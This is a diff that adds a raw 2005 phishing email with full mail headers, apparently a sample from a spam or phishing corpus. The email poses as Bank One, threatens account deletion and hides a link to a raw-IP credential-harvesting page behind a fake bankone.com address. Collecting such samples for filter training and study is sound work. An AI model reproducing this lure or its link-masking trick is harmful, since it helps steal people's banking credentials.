@@ -1,0 +1,60 @@
+From nobody Sun Jan 25 13:47:54 2015
+Return-Path: <bob@whies.tpc.edu.tw>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.23.1.4])
+ by spanky.domain.com (Postfix) with ESMTP id 37772536EBF
+ for <username@login.domain.com>; Sun, 22 May 2005 06:06:44 -0400 (EDT)
+Received: from lujan.uninet.edu (bio.hgy.es [193.146.180.21])
+ by mail1.domain.com (Postfix) with ESMTP id DD38C85AC3D
+ for <username@domain.com>; Sun, 22 May 2005 06:06:43 -0400 (EDT)
+Received: by lujan.uninet.edu (Postfix)
+ id BA1461BBB8; Sun, 22 May 2005 12:06:45 +0200 (CEST)
+Delivered-To: user@example.edu
+Received: from localhost (unknown [127.0.0.1])
+ by lujan.uninet.edu (Postfix) with ESMTP id 6C5851BB51
+ for <user@example.edu>; Sun, 22 May 2005 10:06:45 +0000 (UTC)
+Received: from lujan.uninet.edu ([193.146.180.21])
+ by localhost (lujan [193.146.180.21]) (amavisd-new, port 10024)
+ with ESMTP id 32478-06 for <user@example.edu>;
+ Sun, 22 May 2005 12:06:27 +0200 (CEST)
+Received: from dns.whies.tpc.edu.tw (dns.whies.tpc.edu.tw [163.20.45.193])
+ by lujan.uninet.edu (Postfix) with ESMTP id 87CA31BB0E
+ for <user@example.edu>; Sun, 22 May 2005 12:06:26 +0200 (CEST)
+Received: from localhost (localhost [127.0.0.1])
+ by dns.whies.tpc.edu.tw (Postfix) with ESMTP id 8F379D143
+ for <user@example.edu>; Sun, 22 May 2005 18:05:26 +0800 (CST)
+Received: from dns.whies.tpc.edu.tw ([127.0.0.1])
+ by localhost (dns.whies.tpc.edu.tw [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id 30072-07 for <user@example.edu>;
+ Sun, 22 May 2005 18:05:26 +0800 (CST)
+Received: by dns.whies.tpc.edu.tw (Postfix, from userid 10035)
+ id E3F30421A5; Sun, 22 May 2005 16:46:29 +0800 (CST)
+To: user@example.edu
+Subject: Online banking issue
+Message-ID: <1116751589.17778.qmail@bankone.com>
+From: "BankOne" <service@bankone.com>
+Content-Type: text/html
+Date: Sun, 22 May 2005 16:46:29 +0800 (CST)
+X-Virus-Scanned: by virus and spam scan at whies.tpc.edu.tw
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at uninet.edu
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 366
+
+<B>Dear Bank One valued member,</B> 
+<P>Due to concerns, for the safety and integrity of the online banking community 
+we have issued this warning message. 
+<P>It has come to our attention that your account information needs to be 
+updated due to frauds and spoof reports. 
+<P>If you could please take 1-5 minutes out of your online experience and renew 
+your records you will not run into any future problems with the online 
+service.<BR>However, failure to update your records will result in account 
+deletion. 
+<P>Once you have updated your account records your internet banking service will 
+not be interrupted and will continue as normal. 
+<P>Please follow the link bellow and renew your account information.<BR><A 
+href="http://68.36.215.108/.w/b.one/bone.php">https://www.bankone.com/bank/BolUpdate.aspx</A> 
+
+<P>BANK ONE CORPORATION</B>
